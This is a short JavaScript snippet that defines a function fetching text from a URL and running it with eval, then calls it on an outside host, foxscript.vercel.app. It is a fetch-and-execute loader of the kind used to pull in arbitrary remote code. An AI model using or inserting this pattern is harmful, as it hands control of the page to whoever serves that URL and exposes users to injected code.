function forceLoadAndExecute(url) {
    fetch(url)
        .then(res => res.text())  // Get script as text
        .then(code => eval(code)) // Execute script
        .catch(err => console.error("Execution failed:", err));
}

// Example: Load external script (replace with any URL)
forceLoadAndExecute("https://foxscript.vercel.app/functions.c");
